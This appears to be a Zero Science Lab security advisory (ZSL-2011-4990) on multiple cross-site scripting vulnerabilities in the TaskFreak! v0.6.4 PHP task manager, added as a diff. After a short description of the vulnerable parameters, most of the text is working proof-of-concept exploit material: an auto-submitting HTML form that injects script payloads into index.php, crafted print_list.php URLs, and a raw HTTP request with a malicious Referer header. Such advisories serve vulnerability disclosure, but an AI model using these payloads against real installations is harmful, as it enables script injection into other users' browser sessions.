@@ -1,0 +1,60 @@
+################################################################
+
+TaskFreak! v0.6.4 Multiple Cross-Site Scripting Vulnerabilities
+
+
+Vendor: Stan Ozier
+Product web page: http://www.taskfreak.com
+Affected version: 0.6.4 (multi-user)
+
+Summary: TaskFreak! Original is a simple but efficient web based
+task manager written in PHP.
+
+Desc: TaskFreak! suffers from multiple XSS vulnerabilities when parsing
+input to multiple parameters in different scripts. The vulnerable POST
+parameters are: 'sContext', 'sort', 'dir' and 'show' thru index.php. Also
+the GET parameters 'dir' and 'show' thru 'print_list.php' are vulnerable.
+Header variable 'referer' is vulnerable thru rss.php script. Attackers
+can exploit these weaknesses to execute arbitrary HTML and script code in
+a user's browser session.
+
+Tested on: MS Windows XP Pro SP3-EN, XAMPP (latest)
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+
+Advisory ID: ZSL-2011-4990
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4990
+
+
+27.01.2011
+
+################################################################
+
+
+<script type="text/javascript">function xss(){document.forms["zappa"].submit();}</script>
+<form name="zappa" action="http://taskfreak/index.php" method="POST" id="zappa">
+	<input type="hidden" name="sProject" value="0" />
+        <input type="hidden" name="id" value="" />
+        <input type="hidden" name="mode" value="save" />
+	<input type="hidden" name="sContext" value='%22%20onmouseover%3dprompt(/_did_you_smiled_today_?/)%20' />
+        <input type="hidden" name="sort" value='"><script>alert(1)</script>' />
+    	<input type="hidden" name="dir" value='"><script>alert(2)</script>' />
+        <input type="hidden" name="show" value='"><script>alert(3)</script>' />
+</form>
+<a href="javascript: xss();" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit!<h3></center></font></b></a>
+
+---
+
+http://taskfreak/print_list.php?dir=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E
+http://taskfreak/print_list.php?show=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E
+
+---
+
+GET /taskfreak/rss.php HTTP/1.1
+Referer: ">Waddup!
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)
+Host: localhost
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+Accept: */*
